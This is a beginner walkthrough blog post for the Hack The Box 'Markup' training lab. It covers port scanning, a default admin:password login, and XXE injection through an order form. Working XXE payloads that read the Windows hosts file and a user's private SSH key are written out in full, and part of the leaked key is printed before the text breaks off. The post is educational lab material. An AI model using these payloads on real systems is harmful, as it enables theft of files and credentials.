id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://bluewalle.github.io/ accesskey=h title="Just Keep Swimming (Alt + H)"><img src=https://bluewalle.github.io/apple-touch-icon.png alt aria-label=logo height=35>Just Keep Swimming</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://bluewalle.github.io/posts/ title=posts><span>posts</span></a></li><li><a href=https://bluewalle.github.io/categories/ title=categories><span>categories</span></a></li><li><a href=https://bluewalle.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://bluewalle.github.io/about title=about><span>about</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://bluewalle.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://bluewalle.github.io/posts/>Posts</a></div><h1 class=post-title>HTB - Markup - Walkthrough</h1><div class=post-meta><span title='2023-05-24 08:00:00 +0000 +0000'>May, 2023</span>&nbsp;·&nbsp;12 min&nbsp;·&nbsp;2494 words&nbsp;·&nbsp;bluewalle</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#setup><strong>SETUP</strong></a></li><li><a href=#task-1><strong>TASK 1</strong></a></li><li><a href=#task-2><strong>TASK 2</strong></a></li><li><a href=#task-3><strong>TASK 3</strong></a></li><li><a href=#task-4><strong>TASK 4</strong></a></li><li><a href=#task-5><strong>TASK 5</strong></a></li><li><a href=#task-6><strong>TASK 6</strong></a></li><li><a href=#task-7><strong>TASK 7</strong></a></li><li><a href=#task-8><strong>TASK 8</strong></a></li><li><a href=#submit-flag><strong>SUBMIT FLAG</strong></a></li><li><a href=#submit-flag-1><strong>SUBMIT FLAG</strong></a></li></ul></nav></div></details></div><div class=post-content><p>The aim of this walkthrough is to provide help with the <strong>Markup</strong> machine on the <a href=https://hackthebox.com title="Hack The Box website">Hack The Box website</a>. Please <strong>note</strong> that no <strong>flags</strong> are directly provided here. Moreover, <strong>be aware</strong> that this is only <strong>one</strong> of the <strong>many</strong> ways to solve the challenges.</p><p>It belongs to a series of tutorials that aim to help out complete beginners with finishing the <a href=https://app.hackthebox.com/starting-point title="HTB Starting Point">Starting Point</a> <strong>TIER 2</strong> challenges.</p><h2 id=setup><strong>SETUP</strong><a hidden class=anchor aria-hidden=true href=#setup>#</a></h2><p>There are a couple of ways to <strong>connect</strong> to the <strong>target machine</strong>. The one we will be using <strong>throughout</strong> this <strong>walkthrough</strong> is via the provided <strong>pwnbox</strong>.</p><p>Once our <strong>connection</strong> is taken care of, we <strong>spawn</strong> the <strong>target</strong> <strong>machine</strong>.</p><p>Additionally - even though not required - it is possible to set a <strong>local</strong> variable (only available in the current <strong>shell</strong>) containing our <strong>target host&rsquo;s</strong> IP address. Once set, we can easily <strong>access</strong> it by prepending a <em>$</em> to our variable name.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$rhost</span><span class=o>=</span>&lt;target-hosts-ip&gt;
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $ <span class=nb>echo</span> <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>&lt;target-hosts-ip&gt;
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><p>We could use the <em><strong>unset</strong></em> command to remove it after we no longer need it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>✗<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$unset</span> rhost 
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><h2 id=task-1><strong>TASK 1</strong><a hidden class=anchor aria-hidden=true href=#task-1>#</a></h2><p><strong>Question</strong>: <em>What version of Apache is running on the target&rsquo;s port 80?</em></p><p>A nice way to kick off our <strong>recon</strong> phase is with a quick <strong>connection check</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-fr9bvosx8o<span class=o>]</span>─<span class=o>[</span>~/markup<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ping <span class=nv>$rhost</span> -c <span class=m>4</span>
</span></span><span class=line><span class=cl>PING 10.129.113.61 <span class=o>(</span>10.129.113.61<span class=o>)</span> 56<span class=o>(</span>84<span class=o>)</span> bytes of data.
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.113.61: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>1</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>127</span> <span class=nv>time</span><span class=o>=</span>11.1 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.113.61: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>2</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>127</span> <span class=nv>time</span><span class=o>=</span>10.3 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.113.61: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>3</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>127</span> <span class=nv>time</span><span class=o>=</span>9.71 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.113.61: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>4</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>127</span> <span class=nv>time</span><span class=o>=</span>9.97 ms
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>--- 10.129.113.61 ping statistics ---
</span></span><span class=line><span class=cl><span class=m>4</span> packets transmitted, <span class=m>4</span> received, 0% packet loss, <span class=nb>time</span> 3005ms
</span></span><span class=line><span class=cl>rtt min/avg/max/mdev <span class=o>=</span> 9.708/10.281/11.131/0.535 ms
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-fr9bvosx8o<span class=o>]</span>─<span class=o>[</span>~/markup<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>followed by the usual (version, script, top ports) <strong>tcp</strong> scan.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-fr9bvosx8o<span class=o>]</span>─<span class=o>[</span>~/markup<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ nmap -sC -sV <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-05-24 10:35 BST
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.113.61
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.012s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>997</span> filtered tcp ports <span class=o>(</span>no-response<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT    STATE SERVICE  VERSION
</span></span><span class=line><span class=cl>22/tcp  open  ssh      OpenSSH for_Windows_8.1 <span class=o>(</span>protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> 9fa0f78cc6e2a4bd718768823e5db79f <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 907d96a96e9e4d4094e7bb55ebb30b97 <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> f910eb76d46d4f3e17f393d60b8c4b81 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp  open  http     Apache httpd 2.4.41 <span class=o>((</span>Win64<span class=o>)</span> OpenSSL/1.1.1c PHP/7.2.28<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> http-cookie-flags: 
</span></span><span class=line><span class=cl><span class=p>|</span>   /: 
</span></span><span class=line><span class=cl><span class=p>|</span>     PHPSESSID: 
</span></span><span class=line><span class=cl><span class=p>|</span>_      httponly flag not <span class=nb>set</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.41 <span class=o>(</span>Win64<span class=o>)</span> OpenSSL/1.1.1c PHP/7.2.28
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: MegaShopping
</span></span><span class=line><span class=cl>443/tcp open  ssl/http Apache httpd 2.4.41 <span class=o>((</span>Win64<span class=o>)</span> OpenSSL/1.1.1c PHP/7.2.28<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: TLS randomness does not represent <span class=nb>time</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>localhost
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2009-11-10T23:48:47
</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2019-11-08T23:48:47
</span></span><span class=line><span class=cl><span class=p>|</span> tls-alpn: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  http/1.1
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: MegaShopping
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.41 <span class=o>(</span>Win64<span class=o>)</span> OpenSSL/1.1.1c PHP/7.2.28
</span></span><span class=line><span class=cl><span class=p>|</span> http-cookie-flags: 
</span></span><span class=line><span class=cl><span class=p>|</span>   /: 
</span></span><span class=line><span class=cl><span class=p>|</span>     PHPSESSID: 
</span></span><span class=line><span class=cl><span class=p>|</span>_      httponly flag not <span class=nb>set</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 23.82 seconds
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-fr9bvosx8o<span class=o>]</span>─<span class=o>[</span>~/markup<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>It looks like we have a <strong>windows</strong> <strong>target</strong> on our hands with <strong>three</strong> ports reported <strong>open</strong>:</p><ul><li>port 22 &ndash; ssh</li><li>port 80 &ndash; apache web server</li><li>port 443 &ndash; apache web server</li></ul><p>Given that there is a website <strong>hosted</strong> by the target, we check it&rsquo;s <strong>fingerprint</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-fr9bvosx8o<span class=o>]</span>─<span class=o>[</span>~/markup<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ whatweb http://<span class=nv>$rhost</span>/
</span></span><span class=line><span class=cl>http://10.129.113.61/ <span class=o>[</span><span class=m>200</span> OK<span class=o>]</span> Apache<span class=o>[</span>2.4.41<span class=o>]</span>, Cookies<span class=o>[</span>PHPSESSID<span class=o>]</span>, Country<span class=o>[</span>RESERVED<span class=o>][</span>ZZ<span class=o>]</span>, HTML5, HTTPServer<span class=o>[</span>Apache/2.4.41 <span class=o>(</span>Win64<span class=o>)</span> OpenSSL/1.1.1c PHP/7.2.28<span class=o>]</span>, IP<span class=o>[</span>10.129.113.61<span class=o>]</span>, OpenSSL<span class=o>[</span>1.1.1c<span class=o>]</span>, PHP<span class=o>[</span>7.2.28<span class=o>]</span>, PasswordField<span class=o>[</span>password<span class=o>]</span>, PoweredBy<span class=o>[</span>Megacorp<span class=o>]</span>, Script, Title<span class=o>[</span>MegaShopping<span class=o>]</span>, X-Powered-By<span class=o>[</span>PHP/7.2.28<span class=o>]</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-fr9bvosx8o<span class=o>]</span>─<span class=o>[</span>~/markup<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ whatweb https://<span class=nv>$rhost</span>/
</span></span><span class=line><span class=cl>https://10.129.113.61/ <span class=o>[</span><span class=m>200</span> OK<span class=o>]</span> Apache<span class=o>[</span>2.4.41<span class=o>]</span>, Cookies<span class=o>[</span>PHPSESSID<span class=o>]</span>, Country<span class=o>[</span>RESERVED<span class=o>][</span>ZZ<span class=o>]</span>, HTML5, HTTPServer<span class=o>[</span>Apache/2.4.41 <span class=o>(</span>Win64<span class=o>)</span> OpenSSL/1.1.1c PHP/7.2.28<span class=o>]</span>, IP<span class=o>[</span>10.129.113.61<span class=o>]</span>, OpenSSL<span class=o>[</span>1.1.1c<span class=o>]</span>, PHP<span class=o>[</span>7.2.28<span class=o>]</span>, PasswordField<span class=o>[</span>password<span class=o>]</span>, PoweredBy<span class=o>[</span>Megacorp<span class=o>]</span>, Script, Title<span class=o>[</span>MegaShopping<span class=o>]</span>, X-Powered-By<span class=o>[</span>PHP/7.2.28<span class=o>]</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-fr9bvosx8o<span class=o>]</span>─<span class=o>[</span>~/markup<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>The <strong>fingerprint</strong> we get back is <strong>identical</strong> for the two ports 80 and 443.</p><blockquote><p>2.4.41</p></blockquote><h2 id=task-2><strong>TASK 2</strong><a hidden class=anchor aria-hidden=true href=#task-2>#</a></h2><p><strong>Question</strong>: <em>What username:password combination logs in successfully?</em></p><p>It&rsquo;s time to fire up our <strong>browser</strong> and take a look at the <strong>hosted website</strong>. It looks like an online shop.</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_2/markup/webpage.png alt=webpage title=webpage></p><p>Trying out some of the <strong>default</strong> login <strong>credentials</strong> for <strong>windows</strong> systems does prove successful.</p><table><thead><tr><th>default credentials</th><th></th></tr></thead><tbody><tr><td><em>username</em></td><td style=text-align:left>admin</td></tr><tr><td><em>password</em></td><td style=text-align:left>password</td></tr></tbody></table><p>We <strong>log in</strong> using the <em>admin:password</em> pair.</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_2/markup/post-log-in.png alt=post-log-in title=post-log-in></p><blockquote><p>admin:password</p></blockquote><h2 id=task-3><strong>TASK 3</strong><a hidden class=anchor aria-hidden=true href=#task-3>#</a></h2><p><strong>Question</strong>: <em>What is the word at the top of the page that accepts user input?</em></p><p>Goofing around a bit on the website, these are the observations we might note:</p><ul><li>the <em>Contact</em> field appears to be offline (not working)</li><li>submitting an <em>Order</em> results in a <strong>pop-up window</strong></li></ul><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_2/markup/order-popup.png alt=order-popup title=order-popup></p><blockquote><p>order</p></blockquote><h2 id=task-4><strong>TASK 4</strong><a hidden class=anchor aria-hidden=true href=#task-4>#</a></h2><p><strong>Question</strong>: <em>What XML version is used on the target?</em></p><p>Pressing [ctrl+u] in <strong>Firefox</strong> should enable us a look at the <strong>Page Source</strong>. Looking over the code which belongs to - <em>http://$rhost/services.php</em> - provides us with the answer.</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_2/markup/xml-version.png alt=xml-version title=xml-version></p><blockquote><p>1.0</p></blockquote><h2 id=task-5><strong>TASK 5</strong><a hidden class=anchor aria-hidden=true href=#task-5>#</a></h2><p><strong>Question</strong>: <em>What does the XXE / XEE attack acronym stand for?</em></p><p>It is time to do some <strong>online research</strong>. There are <strong>two</strong> very nice pages both on the <strong>portswigger</strong> website: one introducing <a href=https://portswigger.net/web-security/xxe/xml-entities title="XML entities">XML entities</a> and the second one describing <a href=https://portswigger.net/web-security/xxe title="XEE injections">XEE injections</a>.</p><blockquote><p>xml external entity</p></blockquote><h2 id=task-6><strong>TASK 6</strong><a hidden class=anchor aria-hidden=true href=#task-6>#</a></h2><p><strong>Question</strong>: <em>What username can we find on the webpage&rsquo;s HTML code?</em></p><p>There is a <strong>comment</strong> in the <strong>page source</strong> belonging to the <em>services</em> page.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>...
</span></span></span><span class=line><span class=cl><span class=err>&lt;!-- Modified by Daniel : UI-Fix-9092--&gt;
</span></span></span><span class=line><span class=cl><span class=err>...
</span></span></span></code></pre></div><blockquote><p>daniel</p></blockquote><h2 id=task-7><strong>TASK 7</strong><a hidden class=anchor aria-hidden=true href=#task-7>#</a></h2><p><strong>Question</strong>: <em>What is the file located in the Log-Management folder on the target?</em></p><p>It is time to finally take a closer look at the found <strong>XEE vulnerability</strong>. We can do this by:</p><ul><li>firing up <em><strong>burp suite</strong></em> on our <strong>pwnbox</strong> and <strong>turning on</strong> intercept in the <em><strong>proxy</strong></em> tab</li><li><strong>turning on</strong> the <em><strong>FoxyProxy</strong></em> extension in our <strong>Firefox</strong> to <strong>intercept</strong> communication and <strong>forward</strong> it to <em><strong>burp</strong></em></li><li><strong>submitting</strong> an <strong>order</strong> with some <strong>test data</strong></li><li>sending <strong>intercepted http request</strong> to <strong>burp repeater</strong></li></ul><p>This is what the end result could look like:</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_2/markup/intercepted-order.png alt=intercepted-order title=intercepted-order></p><p>Looking over the research we did in TASK5, there is only one type of <strong>XXE attack</strong> which is of importance for us right now:</p><ul><li>Exploiting XXE to retrieve files</li></ul><p>So <strong>test</strong> it if our <strong>target</strong> is <strong>vulnerable</strong>, let&rsquo;s try and <strong>leak</strong> our it&rsquo;s <strong>host file</strong>. This is our original <strong>xml</strong> document.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl># original
</span></span><span class=line><span class=cl><span class=cp>&lt;?xml version = &#34;1.0&#34;?&gt;</span><span class=nt>&lt;order&gt;&lt;quantity&gt;</span>1<span class=nt>&lt;/quantity&gt;&lt;item&gt;</span>Home Appliances<span class=nt>&lt;/item&gt;&lt;address&gt;</span>testaddress<span class=nt>&lt;/address&gt;&lt;/order&gt;</span>
</span></span></code></pre></div><p>Adjusting it - given that our target is running a <strong>windows</strong> system - we have three different <strong>XEE payloads</strong> with the different data values to play around with.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl># modified XXE payload - quantity data value
</span></span><span class=line><span class=cl><span class=cp>&lt;?xml version = &#34;1.0&#34;?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &#34;file:///c:/windows/system32/drivers/etc/hosts&#34;&gt;</span> ]&gt;<span class=nt>&lt;order&gt;&lt;quantity&gt;</span>
</span></span><span class=line><span class=cl><span class=ni>&amp;xxe;</span><span class=nt>&lt;/quantity&gt;&lt;item&gt;</span>Home Appliances<span class=nt>&lt;/item&gt;&lt;address&gt;</span>testaddress<span class=nt>&lt;/address&gt;&lt;/order&gt;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl># modified XXE payload - item data value
</span></span><span class=line><span class=cl><span class=cp>&lt;?xml version = &#34;1.0&#34;?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &#34;file:///c:/windows/system32/drivers/etc/hosts&#34;&gt;</span> ]&gt;<span class=nt>&lt;order&gt;&lt;quantity&gt;</span>
</span></span><span class=line><span class=cl>1<span class=nt>&lt;/quantity&gt;&lt;item&gt;</span><span class=ni>&amp;xxe;</span><span class=nt>&lt;/item&gt;&lt;address&gt;</span>testaddress<span class=nt>&lt;/address&gt;&lt;/order&gt;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl># modified XXE payload - address data value
</span></span><span class=line><span class=cl><span class=cp>&lt;?xml version = &#34;1.0&#34;?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &#34;file:///c:/windows/system32/drivers/etc/hosts&#34;&gt;</span> ]&gt;<span class=nt>&lt;order&gt;&lt;quantity&gt;</span>
</span></span><span class=line><span class=cl>1<span class=nt>&lt;/quantity&gt;&lt;item&gt;</span>Home Appliances<span class=nt>&lt;/item&gt;&lt;address&gt;</span><span class=ni>&amp;xxe;</span><span class=nt>&lt;/address&gt;&lt;/order&gt;</span>
</span></span></code></pre></div><p>Trying out the <em>quantity</em> data value seems unsuccessful.</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_2/markup/xxe-payload-1.png alt=xxe-payload-1 title=xxe-payload-1></p><p>But using the <em>item</em> data value appears to be working and we can successfully <strong>leak</strong> our target&rsquo;s <strong>host file</strong>.</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_2/markup/xxe-payload-2.png alt=xxe-payload-2 title=xxe-payload-2></p><p>Now that we are able to <strong>leak</strong> and <strong>read</strong> information from our target, our next course of action should be to look for any <strong>authentication information</strong> which we can then leverage to build a better connection to our target.</p><p><strong>Putting</strong> the <strong>pieces</strong> <strong>together</strong>,</p><ul><li><strong>ssh service</strong> is running on port 22 &ndash; TASK1</li><li>potential user <em>daniel</em> &ndash; TASK6</li></ul><p>we try and <strong>leak</strong> the aforementioned user&rsquo;s <strong>private ssh key</strong>. A quick online search provides us with the following potential path: <em>C:\Users\&lt;username>\. ssh\id_rsa</em>.</p><p>With the adjusted <strong>XXE payload</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version = &#34;1.0&#34;?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &#34;file:///c:/users/daniel/.ssh/id_rsa&#34;&gt;</span> ]&gt;<span class=nt>&lt;order&gt;&lt;quantity&gt;</span>
</span></span><span class=line><span class=cl>1<span class=nt>&lt;/quantity&gt;&lt;item&gt;</span><span class=ni>&amp;xxe;</span><span class=nt>&lt;/item&gt;&lt;address&gt;</span>testaddress<span class=nt>&lt;/address&gt;&lt;/order&gt;</span>
</span></span></code></pre></div><p>in <strong>burp</strong></p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_2/markup/leak-ssh-key-payload.png alt=leak-ssh-key-payload title=leak-ssh-key-payload></p><p>we can successfully leak <em>daniel&rsquo;s</em> <strong>private ssh key</strong>.</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_2/markup/leak-ssh-key.png alt=leak-ssh-key title=leak-ssh-key></p><p>This is how daniel&rsquo;s private ssh key looks like:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># daniel&#39;s private ssh key</span>
</span></span><span class=line><span class=cl>-----BEGIN OPENSSH PRIVATE KEY-----
</span></span><span class=line><span class=cl>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
</span></span><span class=line><span class=cl>NhAAAAAwEAAQAAAYEArJgaPRF5S49ZB+Ql8cOhnURSOZ4nVYRSnPXo6FIe9JnhVRrdEiMi
</span></span><span class=line><span class=cl>QZoKVCX6hIWp7I0BzN3o094nWInXYqh2oz5ijBqrn+NVlDYgGOtzQWLhW7MKsAvMpqM0fg
</span></span><span class=line><span class=cl>HYC5nup5qM8LYDyhLQ56j8jq5mhvEspgcDdGRy31pljOQSYDeAKVfiTOOMznyOdY/Klt6+
</span></span><span class=line><span class=cl>ca+7/6ze8LTD3KYcUAqAxDINaZnNrG66yJU1RygXBwKRMEKZrEviLB7dzLElu3kGtiBa0g
</span></span><span class=line><span class=cl>DUqF/SVkE/tKGDH+XrKl6ltAUKfald/nqJrZbjDieplguocXwbFugIkyCc+eqSyaShMVk3
</span></span><span class=line><span class=cl>PKmZCo3ddxfmaXsPTOUpohi4tidnGO00H0f7Vt4v843xTWC8wsk2ddVZZV41+ES99JMlFx
</span></span><span class=line><span class=cl>LoVSXtizaXYX6l8P+FuE4ynam2cRCqWuislM0XVLEA+mGznsXeP1lNL+0eaT3Yt/TpfkPH
</span></span><span class=line><span class=cl>3cUU0VezCezxqDV6rs/o333JDf0klkIRmsQTVMCVAAAFiGFRDhJhUQ4SAAAAB3NzaC1yc2
</span></span><span class=line><span class=cl>EAAAGBAKyYGj0ReUuPWQfkJfHDoZ1EUjmeJ1WEUpz16OhSHvSZ4VUa3RIjIkGaClQl+oSF
</span></span><span class=line><span class=cl>qeyNAczd6NPeJ1iJ12KodqM+Yowaq5/jVZQ2IBjrc0Fi4VuzCrALzKajNH4B2AuZ7qeajP
</span></span><span class=line><span class=cl>C2A8oS0Oeo/I6uZobxLKYHA3Rkct9aZYzkEmA3gClX4kzjjM58jnWPypbevnGvu/+s3vC0
</span></span><span class=line><span class=cl>w9ymHFAKgMQyDWmZzaxuusiVNUcoFwcCkTBCmaxL4iwe3cyxJbt5BrYgWtIA1Khf0lZBP7
</span></span><span class=line><span class=cl>Shgx/l6ypepbQFCn2pXf56ia2W4w4nqZYLqHF8GxboCJMgnPnqksmkoTFZNzypmQqN3XcX
</span></span><span class=line><span class=cl>5ml7D0zlKaIYuLYnZxjtNB9H+1beL/ON8U1gvMLJNnXVWWVeNfhEvfSTJRcS6FUl7Ys2l2
</span></span><span class=line><span class=cl>F+pfD/hbhOMp2ptnEQqlrorJTNF1SxAPphs57F3j9ZTS/tHmk92Lf06X5Dx93FFNFXswns
</span></span><span class=line><span class=cl>8ag1eq7P6N99yQ39JJZCEZrEE1TAlQAAAAMBAAEAAAGAJvPhIB08eeAtYMmOAsV7SSotQJ
</span></span><span class=line><span class=cl>HAIN3PY1tgqGY4VE4SfAmnETvatGGWqS01IAmmsxuT52/B52dBDAt4D+0jcW5YAXTXfStq
</span></span><span class=line><span class=cl>mhupHNau2Xf+kpqS8+6FzqoQ48t4vg2Mvkj0PDNoIYgjm9UYwv77ZsMxp3r3vaIaBuy49J
</span></span><span class=line><span class=cl>ZYy1xbUXljOqU0lzmnUUMVnv1AkBnwXSDf5AV4GulmhG4KZ71AJ7AtqhgHkdOTBa83mz5q
</span></span><span class=line><span class=cl>FDFDy44IyppgxpzIfkou6aIZA/rC7OeJ1Z9ElufWLvevywJeGkpOBkq+DFigFwd2GfF7kD
</span></span><span class=line><span class=cl>1NCEgH/KFW4lVtOGTaY0V2otR3evYZnP+UqRxPE62n2e9UqjEOTvKiVIXSqwSExMBHeCKF
